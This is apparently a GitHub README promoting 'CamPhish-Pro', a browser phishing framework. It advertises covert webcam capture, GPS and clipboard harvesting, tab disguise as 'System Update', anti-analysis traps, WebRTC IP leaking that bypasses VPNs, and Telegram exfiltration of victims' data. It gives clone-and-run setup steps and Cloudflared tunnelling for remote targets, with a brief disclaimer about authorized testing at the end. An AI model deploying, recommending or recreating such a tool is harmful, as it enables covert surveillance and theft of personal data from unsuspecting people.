```markdown
<p align="center">
  <svg width="150" height="150" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M 75 25 L 35 25 L 15 50 L 35 75 L 75 75" stroke="#10b981" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
    <circle cx="40" cy="50" r="10" stroke="#10b981" stroke-width="6"/>
    <path d="M 50 50 L 85 50" stroke="#10b981" stroke-width="6" stroke-linecap="round"/>
    <path d="M 68 50 L 68 62" stroke="#10b981" stroke-width="6" stroke-linecap="round"/>
    <path d="M 78 50 L 78 58" stroke="#10b981" stroke-width="6" stroke-linecap="round"/>
  </svg>
</p>

<h1 align="center">🧬 CAMPHISH-PRO </h1>

<p align="center">
  
  
  
</p>

<p align="center">
  <b>"Deciphering the future before it happens.."</b><br>
  <i>Advanced Neural Security Interaction & Exfiltration Engine</i>
</p>

---

### 🌌 EXECUTIVE OVERVIEW
**CIPHER-CAMPHISH-PRO** is not merely a webcam interaction tool. Developed by **Biruk Getachew (CIPHER)**, it is a **Sovereign-Grade** research engine engineered to bypass modern browser security sandboxes. It aggregates deep system intelligence, high-fidelity media, and sensitive metadata in real-time. Designed to outperform legacy frameworks by a 10x magnitude, it represents the zenith of architectural reconnaissance.

---

### 🛠️ NEURAL OPERATIONAL MODULES [THE ELITE 10]

| MODULE | CODED LOGIC | DESCRIPTION |
| :--- | :--- | :--- |
| **01. Neural Audit** | `v10.0 High-Res` | Professional-grade visual auditing (Webcam Capture) |
| **02. Exfiltration Hub** | `Exfil-Engine` | Stealth transmission of advanced file types to central node |
| **03. GPS Geofencing** | `Neural-Location` | Precise coordinate mapping (Lat/Long) via browser APIs |
| **04. Buffer Snatcher** | `Clipboard-Hook` | Real-time harvesting of sensitive clipboard data |
| **05. Ghost Persistence** | `Tab-Cloaking` | Background persistence via stealth tab-masquerading |
| **06. Device DNA** | `Fingerprinting` | Deep extraction of GPU, CPU, and Battery telemetry |
| **07. Anti-Debug Trap** | `Shield-Logic` | Automated counter-measures against analysis & inspection |
| **08. Shadow Dispatch** | `Async-Telegram` | High-speed, multi-threaded Telegram exfiltration |
| **09. Neural Dashboard** | `V7-Protocol` | Centralized API engine for structured intelligence |
| **10. Local IP Leaker** | `WebRTC-Sync` | Identification of internal network IPs bypassing VPNs |

---

### 🧬 SYSTEM ARCHITECTURE (VISUALIZATION)

```mermaid
graph TD
    A[Target Node] -->|Interaction Hook| B(Neural Interface)
    B -->|Encrypted Blob| C{CIPHER-X Engine}
    C -->|Handshake v10| D[Intel Vault]
    C -->|Secure Sync| E[Media Vault]
    C -->|Shadow Dispatch| F[Telegram Alert]
    style A fill:#000,stroke:#10b981,stroke-width:2px
    style C fill:#111,stroke:#10b981,stroke-width:4px
```



---

### 🚀 DEPLOYMENT PROTOCOL

**CIPHER-CAMPHISH-PRO** is cross-platform and optimized for Linux, Termux, and Windows environments.

```bash
# Clone the Sovereign Repository
git clone https://github.com/cipher-attack/camphish-pro.git

# Enter the Neural Node
cd camphish-pro

# Initialize Environmental Dependencies
./cipher.sh
```

> **Pro-Tip:** For optimal results, select **Choice 3 [Localhost]** for testing or **Choice 1 [Cloudflared]** for remote research nodes.

---

###  WHY CIPHER?
Traditional tools are static. **CIPHER** is an evolving ecosystem. It analyzes the entire digital footprint of a target. From a "Ghost Engine" that renames its tab to "System Update" when hidden, to a neural logic that harvests buffers upon focus—this is not just code; it is architecture-level reconnaissance designed for the elite.

---

### 👨‍💻 THE ARCHITECT

**Developed by: Biruk Getachew (CIPHER)**
*   *Elite Security Researcher & Full-Stack Architect*
*   *Neural Interaction Specialist*

<div align="center">
  <a href="https://www.youtube.com/@cipher-attack">
    
  </a>
  <a href="https://github.com/cipher-attack">
    
  </a>
  <a href="https://t.me/cipher_attacks">
    
  </a>
</div>

---

### 🛡️ LEGAL & ETHICAL DISCLOSURE
This framework is developed strictly for authorized security testing, penetration testing research, and educational purposes. Unauthorized deployment against systems without explicit written consent is illegal. **CIPHER-X** is a contribution to the cybersecurity community intended to harden defenses and study advanced exfiltration vectors.

---

<p align="center">
  <br>
  <b>Deciphering the future before it happens..</b><br>
  
</p>
```
